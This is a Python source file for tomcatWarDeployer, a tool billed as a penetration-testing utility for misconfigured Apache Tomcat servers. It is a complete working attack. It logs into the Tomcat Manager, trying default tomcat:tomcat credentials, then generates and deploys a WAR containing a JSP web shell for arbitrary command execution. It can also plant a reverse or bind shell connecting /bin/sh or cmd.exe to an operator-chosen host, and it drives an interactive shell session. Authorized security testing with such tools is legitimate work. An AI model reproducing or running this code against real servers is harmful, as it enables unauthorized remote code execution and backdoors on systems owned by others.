#!/usr/bin/python
from __future__ import print_function

#
# Apache Tomcat server misconfiguration penetration testing tool.
#   What this tool does is to locate Tomcat server, validate access
#   to it's manager application (web) and then leverage this access
#   in order to upload there an automatically generated WAR application.
#   After having the application uploaded and deployed, script invokes it
#   and then if configured so - handles incoming shell connection (reverse tcp)
#   or connects back to binded shell socket.
#
# In other words - automatic Tomcat WAR deployment pwning tool.
#
# NOTICE:
#   Shell providing functionality (bind&reverse) comes from the Rapid7 Metasploit-Framework,
#   which in turn was based on the code coming from: http://www.security.org.sg/code/jspreverse.html.
#   In order to refer to the original source, please look at the Metasploit core lib.
#   On Linux instances the file can be found at:
#       /usr/share/metasploit-framework/lib/msf/core/payload/jsp.rb
#
# Mariusz B. / MGeeky, '16
#

import re
import os
import sys
import time
import random
import string
import shutil
import base64
import socket
import urllib
import urllib2
import logging
import commands
import optparse
import tempfile
import mechanize
import threading
import subprocess


VERSION = '0.3.3'

RECVSIZE = 8192
SHELLEVENT = threading.Event()
SHELLSTATUS = threading.Event()
SHELLTHREADQUIT = False

# Logger configuration
logging.basicConfig(format='%(levelname)s: %(message)s', level=logging.INFO)
logging.addLevelName(
    logging.DEBUG, "\033[1;32m%s\033[1;0m" % logging.getLevelName(logging.DEBUG))
logging.addLevelName(
    logging.WARNING, "\033[1;35m%s\033[1;0m" % logging.getLevelName(logging.WARNING))
logging.addLevelName(
    logging.ERROR, "\033[1;41m%s\033[1;0m" % logging.getLevelName(logging.ERROR))
logger = logging.getLogger()

class MissingDependencyError(Exception):
    pass

def shellLoop(sock):
    try:
        sock.send('whoami\n')
        whoami = sock.recv(RECVSIZE).strip()
        sock.send('hostname\n')
        hostname = sock.recv(RECVSIZE).strip()
    except (socket.gaierror, socket.error) as e:
        logger.error(
            "Initial commands could not be executed. Something is wrong.\n\tError: '%s'" % e)
        return False

    logger.debug('Connected with the shell: %s@%s' % (whoami, hostname))
    sock.settimeout(0)
    sock.setblocking(1)
    SHELLSTATUS.set()

    if len(whoami) == 0:
        whoami = 'tomcat'
    if len(hostname) == 0:
        hostname = host

    try:
        while True:
            command = raw_input("\n%s@%s $ " % (whoami, hostname))
            if not command:
                continue
            if command.lower() == 'exit' or command.lower() == 'quit':
                break

            sock.send(command + '\n')
            res = sock.recv(RECVSIZE).strip()

            if not len(res) and len(command):
                if serv:
                    serv.close()
                break

            print(res)

    except KeyboardInterrupt:
        SHELLSTATUS.clear()
        # Pass it down to the main function's except block.
        raise KeyboardInterrupt

def shellHandler(mode, hostn, opts):
    logger.debug('Spawned shell handling thread. Awaiting for the event...')
    time.sleep(int(opts.timeout) / 10)

    portpos = hostn.find(':')
    host = extractHostAddress(hostn, opts.url)
    if portpos != -1:
        host = host[:portpos]

    sock = None
    serv = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(int(opts.timeout))
    except socket.error, e:
        logger.error("Creating socket for bind-shell client failed: '%s'" % e)
        return False

    if mode == 0:
        logger.error("Neither reverse nor bind mode occured, out of blue.")
        sock.close()
        return False
    elif mode == 1:
        serv = sock
        sock = establishReverseTcpListener(serv, host, opts)
        if not sock:
            logger.error("Could not establish local TCP listener.")
            serv.close()
            return False
        else:
            sock.setblocking(1)
    elif mode == 2:
        if not connectToBindShell(sock, host, opts):
            logger.error("Could not connect to remote bind-shell.")
            sock.close()
            return False

    shellLoop(sock)
    sock.close()
    if serv:
        serv.close()

    SHELLSTATUS.clear()
    return True

def establishReverseTcpListener(sock, host, opts):
    logger.debug('Establishing listener for incoming reverse TCP shell at %s:%s' % (
        opts.host, opts.port))

    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.bind((opts.host, int(opts.port)))
    except (socket.gaierror, socket.error) as e:
        logger.error("Establishing local listener failed.\n\tError: '%s'" % e)
        return False

    logger.debug('Socket is binded to local port now, awaiting for clients...')
    SHELLEVENT.set()
    sock.listen(2)
    try:
        conn, addr = sock.accept()
        logger.debug("Incoming client: %s:%s" % (addr[0], addr[1]))
    except (socket.gaierror, socket.error) as e:
        logger.error(
            "Remote host did not connected to our handler. Connection failure.")
        return False

    return conn

def connectToBindShell(sock, host, opts):
    SHELLEVENT.wait()
    logger.debug(
        'Shell is to be binded to %s:%s. Connecting back to it...' % (host, opts.port))

    retries = 3
    status = False
    for retry in range(retries):
        try:
            sock.connect((host, int(opts.port)))
            status = True
            break
        except (socket.gaierror, socket.error) as e:
            logger.warning(
                "Retry %d/%d: Connecting to the bind-shell failed.\n\tError: '%s'" % ((retry + 1), retries, e))
            time.sleep(1)

    if not status:
        logger.error(
            'Connection failed. Quitting due to inability to connect back to bind shell.')
        return False

    return True

def generateWAR(code, title, appname):
    dirpath = tempfile.mkdtemp()

    logger.debug('Generating temporary structure for %s WAR at: "%s"' %
                 (appname, dirpath))

    os.makedirs(dirpath + '/files/META-INF')
    os.makedirs(dirpath + '/files/WEB-INF')

    with open(dirpath + '/index.jsp', 'w') as f:
        f.write(code)

    javaver = commands.getstatusoutput('java -version')[1]
    m = re.search('version "([^"]+)"', javaver)
    if m:
        javaver = m.group(1)
        logger.debug('Working with Java at version: %s' % javaver)
    else:
        logger.debug('Could not retrieve Java version. Assuming: "1.8.0_60"')
        javaver = '1.8.0_60'

    with open(dirpath + '/files/META-INF/MANIFEST.MF', 'w') as f:
        f.write('''Manifest-Version: 1.0
Created-By: %s (Sun Microsystems Inc.)

''' % javaver)

    logger.debug('Generating web.xml with servlet-name: "%s"' % title)
    with open(dirpath + '/files/WEB-INF/web.xml', 'w') as f:
        f.write('''<?xml version="1.0" encoding="ISO-8859-1"?>
<web-app xmlns="http://java.sun.com/xml/ns/j2ee"
	xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd"
	version="2.4">

	<display-name>%s</display-name>

	<servlet>
		<servlet-name>%s</servlet-name>
	</servlet>

	<servlet-mapping>
		<servlet-name>%s</servlet-name>
		<url-pattern>/%s</url-pattern>
	</servlet-mapping>

</web-app>
''' % (title, appname.capitalize(), appname.capitalize(), appname))

    cwd = os.getcwd()
    os.chdir(dirpath)
    outpath = tempfile.gettempdir() + '/' + appname + '.war'
    logger.debug('Generating WAR file at: "%s"' % outpath)

    packing = None
    jarpath = None

    # fastjar is an archlinux equivalent.
    jarlocs = ['/bin/jar', '/usr/bin/jar', '/bin/fastjar']
    for l in jarlocs:
        if os.path.exists(l):
            jarpath = l

    if not jarpath:
        # In order to avoid using `which` command which may not be available
        # on every system, we are going to iterate through PATH
        target = 'jar'
        for path in os.environ['PATH'].split(os.pathsep):
            if os.path.exists(os.path.join(path, target)):
                jarpath = os.path.join(path, target)

        if not jarpath:
            logger.debug('jar or fastjar command not found')
            raise MissingDependencyError

    packing = commands.getstatusoutput('"%s" -cvf %s *' % (jarpath, outpath))
    os.chdir(cwd)
    logger.debug(packing[1])

    tree = commands.getstatusoutput('tree %s' % dirpath)[1]
    if not ('sh' in tree and 'tree: not found' in tree):
        logger.debug('WAR file structure:')
        logger.debug(tree)

    return (dirpath, outpath)

def chooseShellFunctionality(opts):
    host = opts.host
    port = opts.port

    if host and port:
        # Reverse TCP
        return 1
    elif port and not host:
        # Bind shell
        return 2
    else:
        return 0

def prepareTcpShellCode(opts):
    host = opts.host
    port = opts.port

    socketInvocation = ''
    mode = chooseShellFunctionality(opts)
    if mode == 1:
        # Reverse TCP
        socketInvocation = '''
		/* Reverse shell */
		Socket socket = new Socket( "%(host)s", %(port)s );
		Process process = Runtime.getRuntime().exec( ShellPath );
		( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
		( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
		''' % {'host' : host, 'port': port }
        logger.debug('Preparing additional code for Reverse TCP shell')
    elif mode == 2:
        # Bind shell
        socketInvocation = '''
		/* Bind shell */
		ServerSocket server_socket = new ServerSocket( %(port)s );
		Socket client_socket = server_socket.accept();
		server_socket.close();
		Process process = Runtime.getRuntime().exec( ShellPath );
		( new StreamConnector( process.getInputStream(), client_socket.getOutputStream() ) ).start();
		( new StreamConnector( client_socket.getInputStream(), process.getOutputStream() ) ).start();
		''' % {'port': port }
        logger.debug('Preparing additional code for bind TCP shell')
    else:
        logger.debug('No additional code for shell functionality requested.')
        return ''

    payload = '''
	<%%
	  class StreamConnector extends Thread {
		InputStream ins;
		OutputStream outs;

		StreamConnector( InputStream ins, OutputStream outs ) {
		  this.ins = ins;
		  this.outs = outs;
		}

		public void run() {
		  BufferedReader bufin  = null;
		  BufferedWriter bufout = null;
		  try {
			bufin  = new BufferedReader( new InputStreamReader( this.ins ) );
			bufout = new BufferedWriter( new OutputStreamWriter( this.outs ) );
			char buffer[] = new char[8192];
			int length;
			while( ( length = bufin.read( buffer, 0, buffer.length ) ) > 0 ) {
			  bufout.write( buffer, 0, length );
			  bufout.flush();
			}
		  } catch( Exception e ){}
		  try {
			if( bufin != null )
			  bufin.close();
			if( bufout != null )
			  bufout.close();
		  } catch( Exception e ){}
		}
	  }

	  try {
		String ShellPath;
		if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
			ShellPath = new String("/bin/sh");
		} else {
			ShellPath = new String("cmd.exe");
		}
		%(socketInvocation)s
	  } catch( Exception e ) {}
	%%>''' % {'socketInvocation': socketInvocation}

    return payload

def preparePayload(opts):
    logger.debug('Generating JSP WAR backdoor code...')

    shellFunc = ''

    if chooseShellFunctionality(opts) > 0:
        shellFunc = '''
	<%%
		if( request.getHeader("X-Pass") != null && request.getHeader("X-Pass").equals("%(password)s")) {
	%%>
			%(shell)s
	<%%
		}
	%%>
	''' % {'password' : opts.shellpass, 'shell': prepareTcpShellCode(opts)}

    payload = '''<%%@page import="java.lang.*"%%>
<%%@page import="java.util.*"%%>
<%%@page import="java.io.*"%%>
<%%@page import="java.net.*"%%>
<%%!
	public String execute(String pass, String cmd) {
		final String hardcodedPass = "%(password)s";
		StringBuilder res = new StringBuilder();

		if (cmd != null && cmd.length() > 0 && (pass.equals(hardcodedPass) || hardcodedPass.toLowerCase().equals("none"))){
			try {
				Process proc = Runtime.getRuntime().exec(cmd);
				OutputStream outs = proc.getOutputStream();
				InputStream ins = proc.getInputStream();
				DataInputStream datains = new DataInputStream(ins);
				String datainsline = datains.readLine();

				while ( datainsline != null) {
					res.append(datainsline + "<br/>");
					datainsline = datains.readLine();
				}
			} catch( IOException e) {
				return "IOException: " + e.getMessage();
			}
		}
		else {
			return "Wrong password or no command issued.";
		}

		return res.toString();
	}
%%><!DOCTYPE html>
<html>
	<head>
		<title>JSP Application</title>
	</head>
	<body>
		<h3>JSP Backdoor deployed as WAR on Apache Tomcat.</h3>
		<i style="font-size:9px">You need to provide valid password in order to leverage RCE.</i>
		<br/>
		<font style="font-size:5px" style="font-style:italic;color:grey">coded by <a href="https://github.com/mgeeky">mgeeky</a></font>
		<br/>
		<hr/>
		<form method=post>
		<table style="width:100%%">
			<tr>
				<td>Password:</td><td style="width:100%%"><input type=password width=40 name="password" value='<%% out.print((request.getParameter("password") != null) ? request.getParameter("password") : ""); %%>' /></td>
			</tr>
			<tr>
				<td>tomcat $ </td><td style="width:100%%"><input type=text size=100 name="cmd" value='<%% out.print((request.getParameter("cmd") != null) ? request.getParameter("cmd") : "uname -a"); %%>' onClick="this.select();" onkeydown="if (event.keyCode == 13) { this.form.submit(); return false; }" /></td>
			</tr>
			<tr>
				<td><input type=submit style="position:absolute;left:-9999px;width:1px;height:1px;" tabindex="-1"/></td><td></td>
			</tr>
		</table>
		</form>
		<hr />
		<pre style="background-color:black;color:lightgreen;padding: 5px 25px 25px 25px;"><%%
			if (request.getParameter("cmd") != null && request.getParameter("password") != null) {
				out.println("<br/>tomcat $ " + request.getParameter("cmd") + "<br/>");
				out.println(execute(request.getParameter("password"), request.getParameter("cmd")));
			}
		%%></pre>
	%(shellPayload)s
	</body>
</html>''' % {'title': opts.title, 'password': opts.shellpass, 'shellPayload': shellFunc }

    return payload

def invokeApplication(browser, url, opts):
    appurl = os.path.join(url, opts.appname) + '/'
    logger.debug('Invoking application at url: "%s"' % appurl)

    host = url[:url.find(':')] if url.find(':') != -1 else url
    if '://' in host:
        host = host[host.find('://') + 3:]
    if '/' in host:
        host = host[:host.find('/')]

    try:
        mode = chooseShellFunctionality(opts)
        if opts.shellpass and mode > 0:
            logger.debug(
                "Adding 'X-Pass: %s' header for shell functionality authentication." % opts.shellpass)
            browser.addheaders.append(('X-Pass', opts.shellpass))

        if opts.noconnect:
            if mode == 0:
                logger.warning(
                    "Connect back to your shell at: %s:%s" % (u, opts.port))
            elif mode == 1:
                logger.warning("Set up your incoming shell listener, I'm giving you %d seconds." % (
                    int(opts.timeout) / 2))
                time.sleep(int(opts.timeout) / 2)
            elif mode == 2:
                logger.warning(
                    "Shell has been binded. Go and connect back to it!")
                logger.warning("How about: \t$ nc %s %s" % (host, opts.port))
        elif not opts.noconnect and mode == 2:
            SHELLEVENT.set()

        resp = browser.open(appurl)
        src = resp.read()
        if 'JSP Backdoor deployed as WAR on Apache Tomcat.' in src:
            logger.debug('Application invoked correctly.')
            return True
        else:
            logger.warning('Could not correctly invoke the application!')
            return False

    except urllib2.HTTPError, e:
        if e.code == 404:
            logger.error(
                'Application "%s" does not exist, or was not deployed.' % opts.appname)
        else:
            logger.error('Failed with error: %d, msg: "%s"' %
                         (int(e.code), str(e)))

    return False

def deployApplication(browser, url, appname, warpath, modify_action=False):
    if not modify_action:
        logger.debug('Deploying application: %s from file: "%s"' %
                     (appname, warpath))

    resp = browser.open(url)
    for form in browser.forms():
        action = urllib.unquote_plus(form.action)

        action_function = ('/upload' in action)

        if not modify_action:
            action_url = url in action
        else:
            action_url = url[:url.find('/', url.find('://') + 3)] in action

        if action_url and action_function:
            browser.form = form
            if modify_action:
                logger.debug(
                    'Adjusting upload form action to conform custom manager\'s URL')
                upload = action[action.find('/upload') + 1:]
                browser.form.action = os.path.join(url, upload)
            browser.form.add_file(open(warpath, 'rb'),
                                  'application/octet-stream', appname + '.war')
            browser.submit()

            checkIsDeployed(browser, url, appname)
            return True

    if not modify_action:
        logger.debug(
            'Could not locate proper upload form. Will try adjusting form action.')
        return deployApplication(browser, url, appname, warpath, True)

    return False

def removeApplication(browser, url, appname):
    browser.open(url)
    for form in browser.forms():
        action = urllib.unquote_plus(form.action)
        if url in action and '/undeploy?path=/' + appname in action:
            browser.form = form
            browser.submit()
            return True

    return False

def checkIsDeployed(browser, url, appname):
    browser.open(url)
    for form in browser.forms():
        action = urllib.unquote_plus(form.action)
        appnameenc = urllib.quote_plus(appname)
        appundeploy = '/undeploy?path=/' + appnameenc
        if url in action and (appundeploy in action or
                              ('/undeploy' in action and 'path=' in action and appnameenc in action)):
            return True

    return False

def unloadApplication(browser, url, appname):
    appurl = 'http://%s/%s/' % (url, appname)
    logger.debug('Unloading application: "%s"' % appurl)
    for form in browser.forms():
        action = urllib.unquote_plus(form.action)
        appnameenc = urllib.quote_plus(appname)
        appundeploy = '/undeploy?path=/' + appnameenc
        if url in action and (appundeploy in action or
                              ('/undeploy' in action and 'path=' in action and appnameenc in action)):
            browser.form = form
            resp = browser.submit()
            content = resp.read()

            try:
                resp = browser.open(appurl)
            except urllib2.HTTPError, e:
                if e.code == 404:
                    return True

    return False

def validateManagerApplication(browser):
    found = 0
    actions = ('stop', 'start', 'deploy', 'undeploy',
               'upload', 'expire', 'reload')
    for form in browser.forms():
        for a in actions:
            action = urllib.unquote_plus(form.action)
            if '/' + a + '?' in action or '/' + a + ';' in action:
                found += 1

    if found > 0:
        return (found >= len(actions) - 2)

    # Maybe dealing with Tomcat/5.x which had links in <A> ?
    for link in browser.links():
        for a in actions:
            action = urllib.unquote_plus(str(link))
            if '/' + a + '?' in action or '/' + a + ';' in action:
                found += 1

    if found > 0:
        logger.debug('Fallback strategy shown we might be dealing with Tomcat 5')
        return (found >= len(actions) - 2)

    return False

def constructBaseUrl(host, url):
    host = host if host.startswith('http') else 'http://' + host
    uri = url[1:] if url.startswith('/') else url
    # return os.path.join(host, uri)
    return host + "/" + uri

def extractHostAddress(hostn, url):
    host = constructBaseUrl(hostn, url)
    host = host[host.find('://') + 3:]
    host = host[:host.find('/')]
    return host

def browseToManager(host, url, user, password):

    error = None
    retry = False
    page = None

    baseurl = constructBaseUrl(host, url)
    managerurl = ''

    tomcat_suffixes = ['', 'manager', 'manager/html']
    error = None
    reached = False

    logger.debug('Browsing to "%s"... Creds: "%s:%s"' %
                 (baseurl, user, password))
    browser = mechanize.Browser()
    cookiejar = mechanize.LWPCookieJar()
    browser.set_cookiejar(cookiejar)
    browser.set_handle_robots(False)
    once = True

    for suffix in tomcat_suffixes:
        try:
            managerurl = os.path.join(baseurl, suffix)
            logger.debug('Trying to fetch: "%s"' % managerurl)
            browser.add_password(managerurl, user, password)
            page = browser.open(managerurl)

            data = page.read()
            m = re.search('Apache Tomcat/([^<]+)', data)
            if m:
                logger.debug('Probably found something: Apache Tomcat/%s' % m.group(1))
                tomcatVersion = m.group(1)

            if validateManagerApplication(browser) and tomcatVersion:
                logger.debug(
                    'Apache Tomcat/%s Manager Application reached & validated.' % (tomcatVersion))
                reached = True
                break

        except urllib2.URLError, e:
            error = str(e)
            if 'Connection refused' in error:
                logger.warning(
                    'Could not connect with "%s", connection refused.' % managerurl)
            elif 'Error 401' in error or '403' in error:
                logger.warning(
                    'Invalid credentials supplied for Apache Tomcat.')
            elif once:
                once = False
                logger.warning(
                    'Browsing to the manager (%s) failed: \n\t%s' % (baseurl, e))
                if ':' not in baseurl[baseurl.find('://') + 3:]:
                    logger.warning(
                        'Did you forgot to specify service port in the host argument (host:port)?')

    if not reached:
        logger.error(
            'Specified URL does not point at the Apache Tomcat Manager Application')
        return None, None

    return browser, managerurl

def generateRandomPassword(N=12):
    return ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(N))

def options():
    version_banner = 'tomcatWarDeployer (v. %s)' % VERSION
    usage = '%prog [options] server\n\n  server\t\tSpecifies server address. Please also include port after colon.'
    parser = optparse.OptionParser(usage=usage)

    general = optparse.OptionGroup(parser, 'General options')
    general.add_option('-V', '--version', dest='version',
                       help='Version information.', action='store_true')
    general.add_option('-v', '--verbose', dest='verbose',
                       help='Verbose mode.', action='store_true')
    general.add_option('-s', '--simulate', dest='simulate',
                       help='Simulate breach only, do not perform any offensive actions.', action='store_true')
    general.add_option('-G', '--generate', metavar='OUTFILE', dest='generate',
                       help='Generate JSP backdoor only and put it into specified outfile path then exit. Do not perform any connections, scannings, deployment and so on.')
    general.add_option('-U', '--user', metavar='USER', dest='user', default='tomcat',
                       help='Tomcat Manager Web Application HTTP Auth username. Default="tomcat"')
    general.add_option('-P', '--pass', metavar='PASS', dest='password', default='tomcat',
                       help='Tomcat Manager Web Application HTTP Auth password. Default="tomcat"')
    parser.add_option_group(general)

    conn = optparse.OptionGroup(parser, 'Connection options')
    conn.add_option('-H', '--host', metavar='RHOST', dest='host',
                    help='Remote host for reverse tcp payload connection. When specified, RPORT must be specified too. Otherwise, bind tcp payload will be deployed listening on 0.0.0.0')
    conn.add_option('-p', '--port', metavar='PORT', dest='port',
                    help='Remote port for the reverse tcp payload when used with RHOST or Local port if no RHOST specified thus acting as a Bind shell endpoint.')
    conn.add_option('-u', '--url', metavar='URL', dest='url', default='',
                    help='Apache Tomcat management console URL. Default: empty')
    conn.add_option('-t', '--timeout', metavar='TIMEOUT', dest='timeout', default='10',
                    help='Speciifed timeout parameter for socket object and other timing holdups. Default: 10')
    parser.add_option_group(conn)

    payload = optparse.OptionGroup(parser, 'Payload options')
    payload.add_option('-R', '--remove', metavar='APPNAME', default=False, action='store_true', dest='remove_appname',
                       help='Remove deployed app with specified name. Can be used for post-assessment cleaning')
    payload.add_option('-X', '--shellpass', metavar='PASSWORD', dest='shellpass',
                       help='Specifies authentication password for uploaded shell, to prevent unauthenticated usage. Default: randomly generated. Specify "None" to leave the shell unauthenticated.', default=generateRandomPassword())
    payload.add_option('-T', '--title', metavar='TITLE', dest='title',
                       help='Specifies head>title for uploaded JSP WAR payload. Default: "JSP Application"', default='JSP Application')
    payload.add_option('-n', '--name', metavar='APPNAME', dest='appname',
                       help='Specifies JSP application name. Default: "jsp_app"', default='jsp_app')
    payload.add_option('-x', '--unload', dest='unload',
                       help='Unload existing JSP Application with the same name. Default: no.', action='store_true', default=False)
    payload.add_option('-C', '--noconnect', dest='noconnect',
                       help='Do not connect to the spawned shell immediately. By default this program will connect to the spawned shell, specifying this option let\'s you use other handlers like Metasploit, NetCat and so on.', action='store_true', default=False)
    payload.add_option('-f', '--file', metavar='WARFILE', dest='file',
                       help='Custom WAR file to deploy. By default the script will generate own WAR file on-the-fly.')
    parser.add_option_group(payload)

    opts, args = parser.parse_args()

    if opts.version:
        print(version_banner)
        sys.exit(0)

    print('''
        %s
	Apache Tomcat auto WAR deployment & launching tool
	Mariusz B. / MGeeky '16

Penetration Testing utility aiming at presenting danger of leaving Tomcat misconfigured.
	''' % version_banner)

    if opts.port:
        try:
            port = int(opts.port)
            if port < 0 or port > 65535:
                raise ValueError
        except ValueError:
            logger.error('RPORT must be an integer in range 0-65535')
            sys.exit(0)

    if (opts.host and not opts.port):
        logger.error(
            'Both RHOST and RPORT must be specified to deploy reverse tcp payload.')
        sys.exit(0)
    elif (opts.port and not opts.host):
        host = extractHostAddress(args[0], opts.url)
        logger.info('Bind shell will be deployed on: %s:%s' %
                    (host, opts.port))
    elif (opts.host and opts.port):
        logger.info('Reverse shell will connect to: %s:%s.' %
                    (opts.host, opts.port))

    if opts.remove_appname and (opts.host or opts.port or opts.file):
        logging.warning(
            'Removing previously deployed package, any further actions will not be undertaken.')

    if opts.generate:
        if opts.file:
            logging.error(
                'Custom JSP WAR file has been specified. Mutually exclusive with generate-only function.')
            sys.exit(0)

        logging.warning(
            'Will generate JSP backdoor and store it into specified output path only.')

    if opts.file and not os.path.exists(file):
        logger.error('Specified WAR file does not exists in local filesystem.')
        sys.exit(0)

    if opts.remove_appname and not opts.appname:
        logger.error(
            'Told to remove WAR application but not specified its name')
        sys.exit(0)

    if opts.verbose:
        logger.setLevel(logging.DEBUG)
    else:
        logger.setLevel(logging.INFO)

    return (opts, args)

def main():
    (opts, args) = options()

    if len(args) < 1:
        logging.error('One shall not go any further without an url!')
        return

    if not opts.generate:
        url = ''
        try:
            browser, url = browseToManager(
                args[0], opts.url, opts.user, opts.password)
        except KeyboardInterrupt:
            logger.info(
                "User has interrupted while browsing to Apache Manager.")
            return

        if browser == None:
            return

    try:
        appname = opts.appname
        if not opts.remove_appname:
            mode = chooseShellFunctionality(opts)
            if mode == 0:
                logger.warning(
                    'You have not specified neither bind nor reverse shell parameres (RHOST and PORT)\n\tGiving you 3 seconds to interrupt the script and modify parameters or proceeding.')
                time.sleep(3)

            if not opts.file and not opts.simulate:
                code = preparePayload(opts)
                (dirpath, warpath) = generateWAR(
                    code, opts.title, opts.appname)

                if opts.generate:
                    os.rename(warpath, opts.generate)
                    logger.debug(
                        'Removing temporary WAR directory: "%s"' % dirpath)
                    shutil.rmtree(dirpath)
                    logging.info(
                        'JSP WAR backdoor has been generated and stored at: "%s"' % opts.generate)
                    return

            else:
                if opts.simulate:
                    logger.info(
                        '[Simulation mode] No JSP backdoor generation.')
                warpath = opts.file

        if checkIsDeployed(browser, url, appname):
            if opts.remove_appname:
                logging.info(
                    "Removing previously deployed WAR application with name: '%s'" % opts.appname)
                if not opts.simulate:
                    if removeApplication(browser, url, opts.appname):
                        logger.info(
                            "\033[0;32mSucceeded. Hasta la vista!\033[1;0m")
                    else:
                        logging.error("Removal failed miserably!")
                else:
                    logger.info('[Simulation mode] No actual JSP removing.')
                return

            logger.warning(
                'Application with name: "%s" is already deployed.' % opts.appname)
            if opts.unload and not opts.simulate:
                logger.debug('Unloading existing one...')
                if unloadApplication(browser, args[0], opts.appname):
                    logger.debug('Succeeded.')
                else:
                    logger.debug('Unloading failed.')
                    return
            elif opts.simulate:
                logger.info(
                    '[Simulation mode] No actual application unloading.')
            else:
                logger.warning(
                    'Not continuing until the application name is changed or current one unloaded.')
                logger.warning(
                    'Please use -x (--unload) option to force existing application unloading.')
                return
        else:
            logger.info(
                'It looks that the application with specified name "%s" has not been deployed yet.' % opts.appname)

            if opts.remove_appname:
                return

        if opts.simulate:
            logger.info(
                '[Simulate mode] Then it goes for JSP backdoor deployment and the game is over.')
            return

        deployed = deployApplication(browser, url, opts.appname, warpath)

        if not opts.file and dirpath:
            logger.debug('Removing temporary WAR directory: "%s"' % dirpath)
            shutil.rmtree(dirpath)

        if deployed:
            logger.debug('Succeeded, invoking it...')

            thread = None
            if not opts.noconnect and (mode == 1 or mode == 2):
                thread = threading.Thread(
                    target=shellHandler, args=(mode, args[0], opts))
                thread.daemon = True
                thread.start()

                if mode == 1:
                    logger.debug(
                        "Awaiting for reverse-shell handler to set-up")
                    if not SHELLEVENT.wait(int(opts.timeout) / 5):
                        logger.error("Could not setup reverse-shell handler.")
                        return

            if invokeApplication(browser, constructBaseUrl(args[0], opts.url), opts):
                logger.info("\033[0;32mJSP Backdoor up & running on %s/\033[1;0m" %
                            os.path.join(constructBaseUrl(args[0], opts.url), opts.appname))
                if opts.shellpass.lower() != 'none':
                    logger.info(
                        "\033[0;33mHappy pwning. Here take that password for web shell: '%s'\033[1;0m" % opts.shellpass)
                else:
                    logger.warning(
                        "\033[0;33mHappy pwning, you've not specified shell password (caution with that!)\033[1;0m")

                if mode == 0:
                    logger.warning(
                        'No direct shell functionality was requested (neither bind nor reverse).')
            else:
                logger.error(
                    "\033[1;41mSorry, no pwning today. Backdoor was not deployed.\033[1;0m")

            if thread != None:
                if not SHELLSTATUS.wait(int(opts.timeout)) and mode != 1:
                    logger.error(
                        'Awaiting for shell handler to bind has timed-out.')
                    logger.error(
                        'Assuming failure, thereof quitting. Sorry about that...')
                else:
                    while SHELLSTATUS.is_set():
                        pass

        else:
            logger.error('Failed deploying application.')

    except KeyboardInterrupt:
        print('\nUser interruption.')

if __name__ == '__main__':
    main()
    print()
